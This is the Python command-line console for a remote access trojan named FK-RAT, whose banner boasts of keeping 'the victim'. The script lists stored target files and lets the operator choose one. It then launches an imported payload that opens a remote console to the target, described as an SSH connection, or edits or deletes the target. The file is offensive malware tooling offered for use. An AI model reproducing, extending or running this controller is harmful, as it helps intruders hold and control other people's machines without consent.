#!/usr/bin/python
# python console for FK-RAT
# created by: Sunnickel
# inspired by: COSMO

import getpass
import os
import sys

from modules import options as opt
from modules import payloads as pay

## variables
banner = """
     ▄▀▀▀█▄    ▄▀▀█▀▄    ▄▀▀▄ ▀▄  ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄      ▄▀▀▄ █  ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄ 
    █  ▄▀  ▀▄ █   █  █  █  █ █ █ █ ▄▀   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐     █  █ ▄▀ ▐  ▄▀   ▐ ▐  ▄▀   ▐ █   █   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐ 
    ▐ █▄▄▄▄   ▐   █  ▐  ▐  █  ▀█ ▐ █    █   █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄       ▐  █▀▄    █▄▄▄▄▄    █▄▄▄▄▄  ▐  █▀▀▀▀    █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄   
     █    ▐       █       █   █    █    █   █    ▌   ▄▀    █  ▀▄   █        █   █   █    ▌    █    ▌     █        █    ▌   ▄▀    █  ▀▄   █  
     █         ▄▀▀▀▀▀▄  ▄▀   █    ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   █     █    █▀▀▀       ▄▀   █   ▄▀▄▄▄▄    ▄▀▄▄▄▄    ▄▀        ▄▀▄▄▄▄   █     █    █▀▀▀   
    █         █       █ █    ▐   █     ▐   █    ▐   ▐     ▐    ▐          █    ▐   █    ▐    █    ▐   █          █    ▐   ▐     ▐    ▐      
    ▐         ▐       ▐ ▐        ▐         ▐                              ▐        ▐         ▐        ▐          ▐                          


        [::] Finders Keepers | You found the victim, we keep it
        [::] Created by : Sunnickel
        [::] Inspired by : BlueCosmo
"""
help_menu = """
        Arguments:
            new     Adds a new target to the RAT
            load    Loads a target file

        Example:
            python3 main.py -f sunnickel.fkrat
"""
option_menu = """
        [*] Select a number to use a payload

        Payloads:
            [0]     Remote Console

        Options:
            [*0]    Edit Target File
            [*1]    Delete Target
"""
target_menu = """
        [*] Select a Target

        Targets:
"""

username = getpass.getuser()
header = f"{username}@FK-RAT"


# command line interface
def cli(arguments):
    print(banner)
    argument = sys.argv[1]
    if arguments:
        target_file = ""
        if argument == "new":
            opt.new_file()
        if argument == "load" or argument == "new":
            print(target_menu)
            targets = []
            i = 0
            for file in os.listdir("./targets"):
                if file.split('.')[1] == "fk":
                    print(f"            [{i}]     {file.split('.')[0]}")
                    targets += [file]
                    i += 1
            if len(os.listdir("./targets")) == 0:
                print(f"            [-]     No targets found")
                print(help_menu)
                exit(0)

            option = input(header + " $ ")
            if len(option) <= len(targets):
                try:
                    choosenfile = targets[int(option)]
                except IndexError:
                    print("[!!] Please enter a valid file")
                    exit()
                print(option_menu)
                option = input(header + " > " + choosenfile + " $ ")
                ## PAYLOADS
                if option == "0":  # SSH Connection to target
                    pay.connect(choosenfile)


                ## OPTIONS
                if option == "*0":
                    opt.edit_file(choosenfile)
                if option == "*1":
                    opt.delete_file(choosenfile)
        else:
            print(help_menu)
    else:
        print(help_menu)


# main code
def main():
    ## check for args
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    cli(arguments_exist)


# run main code
if __name__ == "__main__":
    main()
